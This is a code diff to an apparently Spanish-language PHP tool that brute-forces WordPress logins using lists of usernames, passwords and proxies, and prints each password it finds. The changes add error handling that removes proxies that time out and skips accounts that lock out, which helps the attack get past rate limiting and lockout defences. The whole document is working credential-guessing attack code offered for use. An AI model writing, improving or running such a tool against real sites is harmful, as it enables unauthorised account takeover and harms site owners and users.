@@ -14,14 +14,42 @@ $proxys = file($proxys_file);
 
 echo "\nUsers file: $users_file\nPasswords file: $passwords_file\nTarget: $endpoint\n\n";
 
-function is_not_login_error($e) {
-  if ( strpos($e->getMessage(), 'Usuario') !== false && strpos($e->getMessage(), 'incorrecta') !== false )
-    return false;
+function has($string, $value) {
+  return strpos($string,$value) !== false;
+}
 
-  if ( strpos($e->getMessage(), 'Nome') !== false && strpos($e->getMessage(), 'senha') !== false )
-    return false;
+function is_login_error($e) {
+  $msg = $e->getMessage();
+  if (has($msg, 'Usuario') && has($msg, 'incorrecta'))
+    return true;
 
-  return true;
+  if ( has($msg, 'Nome') && has($msg, 'senha') )
+    return true;
+
+  return false;
+}
+
+function is_proxy_error($e) {
+  $msg = $e->getMessage();
+
+  if ( has($msg,'Connection timed out') ) 
+    return true;
+
+  return false;
+}
+
+function is_user_error($e) {
+  $msg = $e->getMessage();
+ 
+  if (has($msg, 'You have been locked out due to too many invalid login attempts.'))
+    return true;
+
+  return false;
+}
+
+function remove_proxy($proxy) {
+  $i = array_search(implode(':',$proxy),$proxys);
+  unset($proxys[$i]);
 }
 
 $i = 0;
@@ -42,12 +70,20 @@ foreach ( $users as $user ) {
       $a = $wpClient->getProfile();
 
       echo "El password de '$user' es '$pass'\n";
-
+    
     } catch ( Exception $e ) {
-      if ( is_not_login_error($e) ) {
-        echo "\n" . $e->getMessage() . "\n\n";
-      } else {
+      if ( is_login_error($e) ) {
         echo '.';
+
+      } elseif ( is_proxy_error($e) ) {
+        echo "Quitando proxy {$proxy['proxy_ip']}:{$proxy['proxy_port']}\n";
+        remove_proxy($proxy);
+      } elseif (is_user_error($e)) {
+        echo "Salteando usuario $user por errores\n";
+        continue 2;
+      } else {
+        echo "\nProxy: {$proxy['proxy_ip']}\n";
+        echo $e->getMessage() . "\n\n";
       }
     }
   }
